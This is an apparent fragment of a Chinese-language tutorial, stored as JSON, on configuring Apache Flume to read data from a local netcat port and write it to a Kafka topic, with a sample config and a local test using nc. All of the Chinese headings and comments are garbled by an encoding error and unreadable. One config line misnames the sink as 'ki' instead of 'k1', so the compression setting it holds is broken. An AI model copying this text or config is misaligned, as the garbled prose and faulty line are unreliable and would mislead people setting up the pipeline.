2.flumeé‡‡é›†ç«¯å£æ•°æ®åˆ°kafkaè‡ªå®šä¹‰topic\n\n2.1 æ–°å»ºé…ç½®æ–‡ä»¶ flume-kafka-port.conf\n```bash\n#æŒ‡å®šagent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n \n# æè¿°å’Œé…ç½®sourceç»„ä»¶ï¼šr1\na1.sources.r1.type = netcat\na1.sources.r1.bind = localhost\na1.sources.r1.port = 55555 \n# æè¿°å’Œé…ç½®sinkç»„ä»¶ï¼šk1\na1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink\na1.sinks.k1.kafka.topic = topic-test2\na1.sinks.k1.kafka.bootstrap.servers = localhost:9092\na1.sinks.k1.kafka.flumeBatchSize = 20\na1.sinks.k1.kafka.producer.acks = 1\na1.sinks.k1.kafka.producer.linger.ms = 1\na1.sinks.ki.kafka.producer.compression.type = snappy\n \n# æè¿°å’Œé…ç½®channelç»„ä»¶ï¼Œæ­¤å¤„ä½¿ç”¨æ˜¯å†…å­˜ç¼“å­˜çš„æ–¹å¼\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n \n# æè¿°å’Œé…ç½®source  channel   sinkä¹‹é—´çš„è¿æ¥å…³ç³»\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n\n2.2æ‰€æœ‰æ“ä½œä¸ä¸Šæ–‡ä¸€è‡´\nç•¥\n\n2.3 å‘ç«¯å£å‘é€æ•°æ®\n```bash\nroot@ubuntu:~# nc localhost 55555\nOK\nls\nOK\nls\nOK\nls\nOK\nls\nOK\nls\n```\n\nåœ¨æ¶ˆè´¹è€…ç«¯å£å¯ä»¥çœ‹åˆ°\n```bash\nls\nls\nls\nls\nls\n```","tags":["hadoop","kafka","flume"],"categories":["ç¯å¢ƒæ­å»º"]}]